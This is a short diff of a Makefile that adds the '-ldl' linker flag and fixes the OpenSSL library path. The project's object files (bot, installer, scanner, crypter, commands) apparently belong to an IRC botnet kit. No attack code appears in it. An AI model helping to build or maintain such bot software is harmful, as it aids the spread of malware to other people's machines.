@@ -5,7 +5,7 @@ CXX = g++ -ansi -pipe  -gstabs -D_DEBUG
 
 OPTIMIZE = -O1 -fomit-frame-pointer -fno-strength-reduce -ffast-math
 MYCFLAGS = -DLINUX -Ilib/openssl/linux/include
-MYLDFLAGS = -Bstatic -lssl -lcrypto -lpthread
+MYLDFLAGS = -Bstatic -lssl -lcrypto -lpthread -ldl
 FNAME = Priv
 OBJS = cmdline.o mainctrl.o crypter.o cstring.o consdbg.o utility.o random.o \
 	mac.o bot.o commands.o cvar.o installer.o scanner.o nbscanner.o \
@@ -16,7 +16,7 @@ RSAOBJS = rsa/desc.o rsa/digit.o rsa/md2c.o rsa/md5c.o rsa/nn.o rsa/prime.o rsa/
 FTPOBJS = ftplib/ftplib.o
 
 CFLAGS = $(MYCFLAGS)
-LDFLAGS = -Llib/openssl $(MYLDFLAGS)
+LDFLAGS = -Llib/openssl/linux/lib $(MYLDFLAGS)
 
 ifdef OPTIMIZE
 CFLAGS = $(MYCFLAGS) $(OPTIMIZE)
